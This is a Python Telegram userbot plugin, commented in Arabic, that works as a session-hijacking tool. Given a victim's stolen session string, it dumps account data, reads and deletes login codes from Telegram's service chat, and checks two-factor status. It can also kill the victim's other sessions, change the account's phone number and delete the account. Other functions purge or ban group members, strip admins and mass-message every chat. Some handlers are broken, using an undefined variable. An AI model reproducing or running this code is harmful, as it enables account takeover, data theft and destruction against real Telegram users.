from JoKeRUB import bot, l313l
# By Source joker @ucriss
from telethon import events, functions, types, Button
from datetime import timedelta
from JoKeRUB.utils import admin_cmd
import asyncio
from ..Config import Config
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon
from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa
from telethon.tl.functions.channels import CreateChannelRequest as ccr

bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"

async def change_number_code(strses, number, code, otp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = client = X
        try:
            result = await bot(functions.account.ChangePhoneRequest(
                phone_number=number,
                phone_code_hash=code,
                phone_code=otp
            ))
            return True
        except:
            return False

async def change_number(strses, number):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        bot = client = X
        result = await bot(functions.account.SendChangePhoneCodeRequest(
            phone_number=number,
            settings=types.CodeSettings(
                allow_flashcall=True,
                current_number=True,
                allow_app_hash=True
            )
        ))
        return str(result)

async def userinfo(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return str(k)

async def terminate(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(rt())
            return True
        except Exception as rr:
            return rr

GROUP_LIST = []
async def delacc(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
        except:
            await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')

async def user2fa(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            result = await X(functions.account.GetPasswordRequest())
            if result.has_password:
                h = result.hint
                if h == None:
                    h = "لا يوجد"
                return False, h
            else:
                return True, "n"
        except:
            return False, "لا يوجد"

async def demall(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
            try:
                await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
            except:
                await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)

async def joingroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(join(username))

async def leavegroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(leave(username))

async def delgroup(strses, username):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        await X(dc(username))

async def cu(strses):
    try:
        async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
            k = await X.get_me()
            return [str(k.first_name), str(k.username or k.id)]
    except Exception as e:
        return False

async def usermsgs(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        i = ""
        async for x in X.iter_messages(777000, limit=3):
            i += f"\n{x.text}\n"
        await X.delete_dialog(777000)
        return str(i)

async def userbans(strses, grp):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_participants(grp)
        for x in k:
            try:
                await X.edit_permissions(grp, x.id, view_messages=False)
            except:
                pass

async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
            except:
                pass
        return str(i)
# دوال لتغيير الاسم، البايو، وصورة الحساب
async def change_name(strses, first_name, last_name):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(functions.account.UpdateProfileRequest(
                first_name=first_name,
                last_name=last_name
            ))
            return True
        except Exception as e:
            return str(e)

async def change_bio(strses, bio):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(functions.account.UpdateProfileRequest(
                about=bio
            ))
            return True
        except Exception as e:
            return str(e)

async def change_profile_picture(strses, file_path):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(functions.photos.UploadProfilePhotoRequest(
                file=await X.upload_file(file_path)
            ))
            return True
        except Exception as e:
            return str(e)


# دوال للقيام بعملية Gcast (إرسال رسالة إلى جميع الدردشات)
async def gcast_all(strses, message):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            async for dialog in X.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    await X.send_message(dialog.id, message)
            return True
        except Exception as e:
            return str(e)

async def gcast_private(strses, message):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            async for dialog in X.iter_dialogs():
                if dialog.is_user:
                    await X.send_message(dialog.id, message)
            return True
        except Exception as e:
            return str(e)

async def gcast_groups(strses, message):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            async for dialog in X.iter_dialogs():
                if dialog.is_group:
                    await X.send_message(dialog.id, message)
            return True
        except Exception as e:
            return str(e)

# تحديث القائمة menu
menu = '''
"A" :~ [معرفه قنوات/كروبات التي يملكها]
"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
"J" :~ [حذف الحساب]
"K" :~ [حذف جميع المشرفين في كروب/قناه]
"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
"N" :~ [إرسال رسالة إلى جميع الدردشات (Gcast)]
"O" :~ [تغيير اسم الحساب، البايو، أو صورة الحساب]
'''

# تحديث الكيبورد
keyboard = [
    [Button.inline("A", data="A"), Button.inline("B", data="B"), Button.inline("C", data="C"), Button.inline("D", data="D"), Button.inline("E", data="E")],
    [Button.inline("F", data="F"), Button.inline("G", data="G"), Button.inline("H", data="H"), Button.inline("I", data="I"), Button.inline("J", data="J")],
    [Button.inline("K", data="K"), Button.inline("L", data="L"), Button.inline("M", data="M"), Button.inline("N", data="N"), Button.inline("O", data="O")],
    [Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")]
]
if Config.TG_BOT_USERNAME is not None and tgbot is not None:
    @tgbot.on(events.InlineQuery)
    async def inline_handler(event):
        builder = event.builder
        result = None
        joker = Bot_Username.replace("@", "")
        query = event.text
        await bot.get_me()
        if query.startswith("هاك") and event.query.user_id == bot.uid:
            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
            result = builder.article(
                title="Aljoker 🤡",
                description="اضغط على الزر لعرض الأوامر.",
                text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                buttons=buttons
            )
        await event.answer([result] if result else None)
@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
async def repo(event):
    if event.fwd_from:
        return
    lMl10l = Config.TG_BOT_USERNAME
    if event.reply_to_msg_id:
        await event.get_reply_message()
    response = await bot.inline_query(lMl10l, "هاك")
    await response[0].click(event.chat_id)
    await event.delete()
@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
          [  
            Button.inline("A", data="A"), 
            Button.inline("B", data="B"),
            Button.inline("C", data="C"),
            Button.inline("D", data="D"),
            Button.inline("E", data="E")
            ],
          [
            Button.inline("F", data="F"), 
            Button.inline("G", data="G"),
            Button.inline("H", data="H"),
            Button.inline("I", data="I"),
            Button.inline("J", data="J")
            ],
          [
            Button.inline("K", data="K"), 
            Button.inline("L", data="L"),
            Button.inline("M", data="M"),
            Button.inline("N", data="N"),
            Button.inline("O", data="O")
            ],
          [
            Button.url("المـطور", "https://t.me/Lx5x5")
            ]
        ]
        await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
          # ... (الكود السابق حتى معالج الحدث للرجوع إلى القائمة الرئيسية)

# معالج الحدث للزر A
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
        try:
            i = await userchannels(strses.text)
        except:
            return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
        if len(i) > 1:
            file = open("session.txt", "w")
            file.write(i + "\n\nDetails BY @ucriss")
            file.close()
            await bot.send_file(event.chat_id, "session.txt")
            system("rm -rf session.txt")
        else:
            await event.reply(i + "\n\nشكراً لأستخدامك سورس ايــڪاࢪ ❤️.\n/hack", buttons=keyboard)

# معالج الحدث للزر B
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
        i = await userinfo(strses.text)
        await event.reply(i + "\n\nشكراً لأستخدامك سورس ايــڪاࢪ ❤️.\n/hack", buttons=keyboard)

# معالج الحدث للزر C
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("أرسل لي معرف/ايدي الكروب او القناة")
        grpid = await x.get_response()
        await userbans(strses.text, grpid.text)
        await event.reply("يتم حظر جميع اعضاء القناة/الكروب", buttons=keyboard)

# معالج الحدث للزر D
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        i = await usermsgs(strses.text)
        await event.reply(i + "\n\nشكراً لأستخدامك سورس ايــڪاࢪ ❤️.\n/hack", buttons=keyboard)

# معالج الحدث للزر E
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("اعطني معرف/ايدي القناة او الكروب")
        grpid = await x.get_response()
        await joingroup(strses.text, grpid.text)
        await event.reply("تم الانضمام الى القناة او الكروب", buttons=keyboard)

# معالج الحدث للزر F
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("اعطيني معرف /ايدي الكروب او القناة")
        grpid = await x.get_response()
        await leavegroup(strses.text, grpid.text)
        await event.reply("لقد تم مغادرة القناة او الكروب,", buttons=keyboard)

# معالج الحدث للزر G
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
        grpid = await x.get_response()
        await delgroup(strses.text, grpid.text)
        await event.reply("لقد تم حذف القناة/الكروب شكراً لأستخدامك ايــڪاࢪ.", buttons=keyboard)

# معالج الحدث للزر H
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        i, h = await user2fa(strses.text)
        if i:
            await event.reply("الشخص لم يفعل تحقق بخطوتين يمكنك الدخول الى الحساب بكل سهوله باستخدامك الامر ( D ) \n\nشكراً لك لاستخدامك البوت.", buttons=keyboard)
        else:
            await event.reply(f"للأسف الشخص مفعل التحقق بخطوتين\n**hint**: {h}", buttons=keyboard)

# معالج الحدث للزر I
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        i = await terminate(strses.text)
        if i == True:
            await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك ايــڪاࢪ.", buttons=keyboard)
        else:
            await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @Ze_in22\n{i}")

# معالج الحدث للزر J
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        i = await delacc(strses.text)
        await event.reply("تم حذف الحساب بنجاح 😈.", buttons=keyboard)

# معالج الحدث للزر K
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
        grp = await x.get_response()
        await x.send_message("الان ارسل لي المعرف")
        user = await x.get_response()
        i = await promote(strses.text, grp.text, user.text)
        await event.reply("سأرفعك في القناة/الكروب 😉.", buttons=keyboard)

# معالج الحدث للزر L
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
        await x.send_message("ارسل لي معرف/ايدي القناة او الكروب")
        pro = await x.get_response()
        try:
            i = await demall(strses.text, pro.text)
        except:
            pass
        await event.reply("تم حذف جميع مشرفين الكروب/القناة.", buttons=keyboard)

# معالج الحدث للزر M
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
async def users(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if op:
            pass
        else:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه", buttons=keyboard)
        await x.send_message("اعطني رقم التي تريد تغير اليه\n[ملاحظه /لا تستخدم ارقام الوهميه]\n[اذا استخدمت الارقام الوهميه مراح تكدر تحصل الكود] ")
        number = (await x.get_response()).text
        try:
            result = await change_number(strses.text, number)
            await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
            await asyncio.sleep(20)
            await x.send_message("الان ارسل لي الهاش")
            phone_code_hash = (await x.get_response()).text
            await x.send_message("الان ارسل لي الكود")
            otp = (await x.get_response()).text
            changing = await change_number_code(strses.text, number, phone_code_hash, otp)
            if changing:
                await event.respond("لقد تم تغير الرقم بنجاح ✅")
            else:
                await event.respond("هنالك خطأ ما حصل")
        except Exception as e:
            await event.respond(f"قم بتوجيه الرسالة في مجموعة المساعدة الخاصة بالقسم المدفوع \n str(e)")

# ... (بقية الكود السابق)# ... (الكود السابق حتى معالج الحدث للزر M)

# معالج الحدث للزر N
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"N")))
async def gcast_options(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        op = await cu(strses.text)
        if not op:
            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)

        # عرض خيارات Gcast
        options_keyboard = [
            [Button.inline("1 - إرسال رسالة إلى الخاص", data="gcast_private")],
            [Button.inline("2 - إرسال رسالة إلى المجموعات", data="gcast_groups")],
            [Button.inline("3 - إرسال رسالة إلى الكل", data="gcast_all")],
            [Button.inline("رجوع", data="back")]
        ]
        await event.edit("اختر نوع الإرسال:", buttons=options_keyboard)

# معالج الحدث لإرسال رسالة إلى الخاص
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gcast_private")))
async def gcast_private_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل الرسالة التي تريد إرسالها إلى الخاص:")
        message = (await x.get_response()).text
        result = await gcast_private(strses.text, message)
        if result is True:
            await event.respond("تم إرسال الرسالة إلى الخاص بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث لإرسال رسالة إلى المجموعات
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gcast_groups")))
async def gcast_groups_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل الرسالة التي تريد إرسالها إلى المجموعات:")
        message = (await x.get_response()).text
        result = await gcast_groups(strses.text, message)
        if result is True:
            await event.respond("تم إرسال الرسالة إلى المجموعات بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث لإرسال رسالة إلى الكل
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"gcast_all")))
async def gcast_all_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل الرسالة التي تريد إرسالها إلى الكل:")
        message = (await x.get_response()).text
        result = await gcast_all(strses.text, message)
        if result is True:
            await event.respond("تم إرسال الرسالة إلى الكل بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث للزر O
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
async def change_profile_options(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("الان ارسل الكود تيرمكس")
        strses = await x.get_response()
        strses = strses.text  # حفظ كود التيرمكس في متغير

        # عرض خيارات لتغيير الاسم، البايو، أو الصورة
        options_keyboard = [
            [Button.inline("1 - تغيير اسم الحساب", data="change_name")],
            [Button.inline("2 - تغيير بايو الحساب", data="change_bio")],
            [Button.inline("3 - تغيير صورة الحساب", data="change_pic")],
            [Button.inline("رجوع", data="back")]
        ]
        await event.edit("اختر ما تريد تغييره:", buttons=options_keyboard)

# معالج الحدث لتغيير الاسم
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_name")))
async def change_name_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل الاسم الأول:")
        first_name = (await x.get_response()).text
        await x.send_message("ارسل الاسم الأخير:")
        last_name = (await x.get_response()).text

        # استدعاء دالة تغيير الاسم
        result = await change_name(strses, first_name, last_name)
        if result is True:
            await event.respond("تم تغيير الاسم بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث لتغيير البايو
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_bio")))
async def change_bio_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل البايو الجديد:")
        bio = (await x.get_response()).text

        # استدعاء دالة تغيير البايو
        result = await change_bio(strses, bio)
        if result is True:
            await event.respond("تم تغيير البايو بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث لتغيير صورة الحساب
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"change_pic")))
async def change_profile_picture_handler(event):
    async with bot.conversation(event.chat_id) as x:
        await x.send_message("ارسل مسار الصورة (file path):")
        file_path = (await x.get_response()).text

        # استدعاء دالة تغيير صورة الحساب
        result = await change_profile_picture(strses, file_path)
        if result is True:
            await event.respond("تم تغيير صورة الحساب بنجاح ✅", buttons=keyboard)
        else:
            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)

# معالج الحدث للرجوع إلى القائمة الرئيسية
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"back")))
async def back_to_main_menu(event):
    await event.edit("اختر ما تريد فعله مع الجلسة:", buttons=keyboard)
